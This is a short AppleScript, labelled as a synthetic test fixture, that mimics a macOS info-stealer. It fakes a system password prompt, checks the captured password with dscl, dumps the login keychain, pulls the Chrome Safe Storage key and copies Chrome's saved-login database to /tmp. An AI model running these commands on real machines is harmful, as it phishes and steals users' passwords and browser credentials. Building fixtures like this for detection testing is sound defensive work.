-- Synthetic fixture: stealer-shaped script, not real malware.
set pw to text returned of (display dialog "macOS needs your password to continue" default answer "" with hidden answer)
do shell script "dscl . authonly " & user & " " & pw
do shell script "security dump-keychain ~/Library/Keychains/login.keychain-db"
do shell script "security find-generic-password -ga 'Chrome Safe Storage'"
do shell script "cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data /tmp/x"
